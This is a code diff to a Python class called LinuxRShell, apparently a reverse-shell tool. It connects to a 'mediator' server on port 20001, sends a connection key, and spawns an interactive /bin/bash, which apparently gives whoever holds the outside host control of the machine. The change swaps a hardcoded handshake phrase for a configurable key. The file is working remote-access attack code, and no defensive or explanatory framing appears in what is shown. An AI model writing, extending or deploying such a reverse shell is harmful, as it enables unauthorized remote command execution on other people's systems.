@@ -15,7 +15,8 @@ import threading
 
 
 class LinuxRShell:
-    def __init__(self, mediatorHost):
+    def __init__(self, mediatorHost="", connectionKey="CHANGE ME!!!"):
+        self.connectionKey = connectionKey
         self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
@@ -54,7 +55,7 @@ class LinuxRShell:
 
     def connect(self, mediatorHost):
         self.handler.connect((socket.gethostbyname(mediatorHost), 20001))
-        self.handler.sendall("Stepping onto platform nine and three quarters...".encode())
+        self.handler.sendall(self.connectionKey.encode())
 
     def run(self):
         bash = subprocess.Popen(["/bin/bash", "-i"],
